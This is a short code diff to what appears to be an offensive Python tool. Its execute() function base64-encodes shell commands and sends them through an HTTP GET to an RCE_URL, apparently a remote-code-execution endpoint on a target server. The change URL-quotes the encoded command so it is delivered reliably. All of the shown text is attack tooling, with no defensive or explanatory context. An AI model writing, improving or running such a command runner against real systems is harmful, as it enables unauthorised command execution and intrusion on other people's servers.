@@ -6,6 +6,7 @@ from time import sleep
 from threading import Thread
 from random import randint
 from base64 import b64encode
+from urllib.parse import quote
 from termcolor import colored
 
 WRITABLE_FOLDER = "/tmp"
@@ -20,7 +21,7 @@ def execute(cmd, timeout=None, verbose=False):
         print("Executing %s" % pcmd)
         if timeout:
             print("Timeout: %s" % timeout)
-    encoded = b64encode(cmd.encode()).decode()
+    encoded = quote(b64encode(cmd.encode()).decode())
     try:
         r = requests.get(RCE_URL % encoded, timeout=timeout)
     except requests.exceptions.Timeout:
